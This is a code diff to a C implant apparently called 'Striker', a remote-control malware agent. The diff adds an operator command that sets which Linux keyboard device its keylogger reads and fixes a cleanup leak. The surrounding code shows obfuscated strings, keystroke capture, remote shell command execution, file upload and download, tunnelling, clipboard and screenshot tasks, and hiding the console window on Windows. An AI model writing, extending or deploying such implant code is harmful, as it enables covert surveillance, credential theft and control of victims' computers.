@@ -64,6 +64,8 @@ short keymon_active = 0;
 #ifdef IS_WINDOWS
   static short *keymon_keystrokes = NULL;
   static size_t keymon_keystrokes_count = 0;
+#else
+  char KEYMON_DEFAULT_KBD[] = "[OBFS_ENC]/dev/input/by-path/platform-i8042-serio-0-event-kbd";
 #endif
 
 char *obfs_decode(char *str){
@@ -356,6 +358,7 @@ int web_download(char *url, FILE *wfo){
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_downloader);
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, wfo);
     CURLcode res = curl_easy_perform(curl);
+    curl_easy_cleanup(curl);
     return (res != CURLE_OK);
   #else
     HINTERNET hInternet = InternetOpenA(STRIKER_USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
@@ -523,15 +526,15 @@ void keymon(session *striker, task *tsk){
   keymon_active = 1;
   cJSON *data = tsk->data;
   #ifdef IS_LINUX
-    char strs[][100] = {"[OBFS_ENC]duration", "[OBFS_ENC]/dev/input/by-path/platform-i8042-serio-0-event-kbd", "[OBFS_ENC]Error opening keyboard file!", "[OBFS_ENC] No keys logged!", "[OBFS_ENC]uid", "[OBFS_ENC]result", "[OBFS_ENC]successful", "[OBFS_ENC]main-kbd"};
-    for (int i = 0; i < 8; i++)
+    char strs[][100] = {"[OBFS_ENC]duration", "[OBFS_ENC]Error opening keyboard file!", "[OBFS_ENC] No keys logged!", "[OBFS_ENC]uid", "[OBFS_ENC]result", "[OBFS_ENC]successful", "[OBFS_ENC]main-kbd"};
+    for (int i = 0; i < 7; i++)
       obfs_decode(strs[i]);
     buffer *result_buff = create_buffer(0);
     unsigned long duration = (unsigned short)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
     unsigned char *keys = malloc(sizeof(unsigned char) * KEYMON_MAX_KEYSTROKES);
     size_t count = 0;
-    int kb = open(strs[1], O_RDONLY);
     unsigned char main_kb_attached = 1;
+    int kb = open(striker->kbd_event_file, O_RDONLY);
     if (kb == -1){
       buffer_strcpy(result_buff, strs[2]);
       main_kb_attached = 0;
@@ -568,7 +571,6 @@ void keymon(session *striker, task *tsk){
       }
       close(kb);
     }
-
     pthread_join(tid, NULL);
 
     queue_seek(km_proc_dumps, 0);
@@ -591,18 +593,18 @@ void keymon(session *striker, task *tsk){
     queue_free(km_proc_dumps, 0);
     queue_free(km_proc_arg, 0);
     
-    cJSON_AddItemToObject(tsk->result, strs[4], cJSON_CreateString(tsk->uid));
+    cJSON_AddItemToObject(tsk->result, strs[3], cJSON_CreateString(tsk->uid));
     if (count > 0){
       cJSON *main_kb_keys = cJSON_CreateArray();
       for (int i = 0; i < count; i++)
         cJSON_AddItemToArray(main_kb_keys, cJSON_CreateNumber(keys[i]));
-      cJSON_AddItemToObject(tsk->result, strs[7], main_kb_keys);
+      cJSON_AddItemToObject(tsk->result, strs[6], main_kb_keys);
       tsk->successful = 1;
     }else{
       char *res = buffer_to_string(result_buff);
-      cJSON_AddItemToObject(tsk->result, strs[5], cJSON_CreateString(res));
+      cJSON_AddItemToObject(tsk->result, strs[4], cJSON_CreateString(res));
     }
-    cJSON_AddItemToObject(tsk->result, strs[6], cJSON_CreateNumber(tsk->successful));
+    cJSON_AddItemToObject(tsk->result, strs[5], cJSON_CreateNumber(tsk->successful));
     free(keys);
     free_buffer(result_buff);
   #else
@@ -1431,8 +1433,8 @@ DWORD WINAPI task_executor(LPVOID ptr)
   #endif
   cJSON *data = tsk->data;
   buffer *result_buff = create_buffer(0);
-  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd", "[OBFS_ENC]kill", "[OBFS_ENC]tunnel", "[OBFS_ENC]bridge", "[OBFS_ENC]webload", "[OBFS_ENC]clipread", "[OBFS_ENC]clipwrite", "[OBFS_ENC]screenshot"};
-  for (int i = 0; i < 14; i++)
+  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd", "[OBFS_ENC]kill", "[OBFS_ENC]tunnel", "[OBFS_ENC]bridge", "[OBFS_ENC]webload", "[OBFS_ENC]clipread", "[OBFS_ENC]clipwrite", "[OBFS_ENC]screenshot", "[OBFS_ENC]kbdfile"};
+  for (int i = 0; i < 15; i++)
     obfs_decode(cmd_strs[i]);
   if (!strcmp(tsk->type, cmd_strs[0])){ // Run a shell command.
     char strs[][20] = {"[OBFS_ENC]cmd", "[OBFS_ENC]%s 2>&1"};
@@ -1619,6 +1621,11 @@ DWORD WINAPI task_executor(LPVOID ptr)
     }
     free(upload_url);
     free(filename);
+  }else if (!strcmp(tsk->type, cmd_strs[14])){
+    #ifdef IS_LINUX
+    strncpy(striker->kbd_event_file, cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "file")), PATH_MAX - 1);
+    tsk->successful = 1;
+    #endif
   }else{
     char msg[] = "[OBFS_ENC]Not implemented!";
     buffer_strcpy(result_buff, obfs_decode(msg));
@@ -1670,8 +1677,12 @@ void start_session(){
   if (striker->delay == 0)
     striker->delay = 10;
   striker->abort = 0;
+  #ifdef IS_LINUX
+  striker->kbd_event_file = malloc(PATH_MAX);
+  memset(striker->kbd_event_file, 0, PATH_MAX);
+  strncpy(striker->kbd_event_file, obfs_decode(KEYMON_DEFAULT_KBD), PATH_MAX - 1);
+  #endif
   char *tmp;
-
   buffer *body = create_buffer(0); // Dynamic buffer for receiving response body.
   int status_code;
 
@@ -1913,23 +1924,26 @@ void cleanup_session(session *striker){
 
   free(striker->uid);
   free(striker->auth_key);
+  #ifdef IS_LINUX
+  free(striker->kbd_event_file);
+  #endif
   free(striker);
 }
 
 int main(int argc, char **argv){
 
   #ifdef STRIKER_DEBUG
-    printf("[*] Starting Striker...\n");
+  printf("[*] Starting Striker...\n");
   #endif
   #ifdef IS_LINUX
-    curl_global_init(CURL_GLOBAL_ALL);
-    start_session();
-    curl_global_cleanup();
+  curl_global_init(CURL_GLOBAL_ALL);
+  start_session();
+  curl_global_cleanup();
   #else
-    HWND hWnd = GetConsoleWindow();
-    ShowWindow(hWnd, SW_MINIMIZE);
-    ShowWindow(hWnd, SW_HIDE);
-    start_session();
+  HWND hWnd = GetConsoleWindow();
+  ShowWindow(hWnd, SW_MINIMIZE);
+  ShowWindow(hWnd, SW_HIDE);
+  start_session();
   #endif
   return 0;
 }
